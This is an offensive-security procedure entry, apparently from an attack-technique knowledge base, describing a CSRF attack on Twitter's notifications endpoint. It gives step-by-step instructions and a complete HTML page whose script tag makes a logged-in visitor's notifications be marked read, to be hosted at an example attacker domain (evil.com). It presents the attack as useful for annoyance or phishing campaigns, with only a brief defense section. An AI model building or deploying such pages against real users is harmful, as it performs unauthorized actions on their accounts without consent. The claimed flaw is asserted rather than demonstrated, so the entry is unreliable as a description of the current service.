---
id: proc-001
tags:
  - csrf
  - twitter
  - web
  - script-tag
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:22.825Z'
skill_level: low
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Embed-Malicious-Script-Tag-for-Twitter-CSRF

## Summary

This procedure involves embedding a simple script tag in HTML on a third-party website to exploit a CSRF vulnerability in Twitter's notifications system, preparing the site to trigger unauthorized actions when visited by a logged-in user.

## Description

The CSRF vulnerability stems from Twitter's notifications endpoint (https://twitter.com/i/notifications) lacking proper CSRF protection, allowing cross-origin script loads to perform state-changing operations like marking notifications as read. By including a <script src> tag pointing to this endpoint in malicious HTML, the browser of a logged-in user will fetch and execute it upon page load, effectively clearing unread notifications without consent. This is useful in annoyance attacks or as part of broader phishing campaigns. Prerequisites include control over a web hosting environment.

## Requirements

1. Access to a web server or hosting service to deploy HTML files
2. Basic knowledge of HTML
3. Target user must be logged into Twitter in their browser

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens or SameSite cookies on state-changing endpoints
- Monitor for unexpected cross-origin requests to internal endpoints
- Educate users on avoiding untrusted links

## Objectives

1. Set up a malicious webpage that triggers the CSRF
2. Prepare for victim interaction
3. Achieve unauthorized notification clearing

## Instructions

### Step 1: Create Malicious HTML File

**Context**: Build the HTML page containing the CSRF-triggering script tag to load Twitter's vulnerable endpoint.

```html
<!DOCTYPE html>
<html>
<head><title>Malicious Page</title></head>
<body>
    <h1>Welcome</h1>
    <script src="https://twitter.com/i/notifications"></script>
</body>
</html>
```

> This HTML, when loaded, uses the script src to make a cross-origin GET request to the endpoint, marking notifications as read due to the lack of CSRF checks. Save as index.html.

### Step 2: Host the HTML File

**Context**: Deploy the file to a publicly accessible web server so it can be visited by the target.

Upload or serve the file via your hosting provider (e.g., GitHub Pages, Apache, or Nginx). Obtain the public URL (e.g., https://evil.com).

> Expected output: A live webpage at the URL. Test by visiting in an incognito window logged into Twitter; check if notifications clear.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[twitter]]
- [[web]]
